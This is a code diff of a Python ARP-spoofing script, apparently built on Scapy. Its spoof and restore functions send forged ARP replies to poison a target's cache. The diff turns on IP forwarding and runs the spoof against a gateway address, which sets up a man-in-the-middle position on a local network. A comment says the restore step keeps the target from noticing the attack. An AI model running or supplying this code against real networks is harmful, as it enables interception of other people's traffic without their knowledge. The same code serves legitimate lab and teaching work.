@@ -23,7 +23,7 @@ def getMacAddr(ip):
     if result:
         return result[0][1].src
     
-def spoof(targetIP, hostIP, verbose=True):
+def spoof(targetIP, hostIP, verbose=True) -> str:
     #will spoof the targetIP pretending to be the 'hostIP' argument, this is done by changing the ARP cache of the target IP.
 
     #first we get the macAddr of the target
@@ -38,9 +38,12 @@ def spoof(targetIP, hostIP, verbose=True):
     if verbose:
         #obtain MAC address of our default interface
         myMac = ARP().hwsrc
-        print(f'[+] Sent to {targetIP} : {hostIP} us-at {myMac}')
+        ret_str = f'[+] Sent to {targetIP} : {hostIP} us-at {myMac}'
+        print(ret_str)
+        return ret_str
 
-def restore(targetIP, hostIP, verbose=True):
+
+def restore(targetIP, hostIP, verbose=True) -> str:
     #must reset everything or else the targets internet will crash
     #and the target will know an attack has happened
     target_mac = getMacAddr(targetIP) # the real MAC address of target
@@ -48,16 +51,20 @@ def restore(targetIP, hostIP, verbose=True):
     arp_response = ARP(pdst=targetIP, hwdst=target_mac, psrc=hostIP, hwsrc=host_mac) # crafting the restoring packet
     send(arp_response, verbose=0, count=7)# sending the restoring packet
     if verbose:
-        print(f'[+] Sent to {targetIP} : {hostIP} is-at {host_mac}')
+        ret_str = f'[+] Sent to {targetIP} : {hostIP} is-at {host_mac}'
+        print(ret_str)
+        return ret_str
+
+
 
 # for testing
 sys.stdout = open("output.txt", "w+")
         
 targetIP = '192.168.1.1'
 
-#enable_linuxip()
+enable_linuxip()
 print(getMacAddr(targetIP))
-#restore('192.168.0.63',targetIP,True)
+restore('192.168.0.63',targetIP,True)
 
 spoof(targetIP, '192.168.1.144')
 
